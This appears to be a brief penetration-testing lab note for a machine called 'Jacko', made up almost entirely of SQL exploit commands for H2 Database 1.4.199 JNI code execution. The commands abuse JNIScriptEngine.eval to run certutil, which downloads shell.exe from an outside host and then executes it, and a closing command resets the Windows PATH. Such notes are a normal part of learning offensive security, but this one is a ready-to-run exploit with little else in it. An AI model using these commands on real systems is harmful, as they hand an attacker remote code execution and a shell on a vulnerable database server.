# Jacko - H2 Database 1.4.199 - JNI Code Execution

Reference: https://www.exploit-db.com/exploits/49384

**Transfer shell to machine:**

```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.200/shell.exe c:/temp/shell.exe").getInputStream()).useDelimiter("\\\\Z").next()');
```

**Execute shell:**

```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("c:/temp/shell.exe").getInputStream()).useDelimiter("\\\\Z").next()');
```

## Fix PATH / Windows

```cmd
set PATH=%SystemRoot%\system32;%SystemRoot%;C:\Windows\System32\WindowsPowerShell\v1.0\;
```
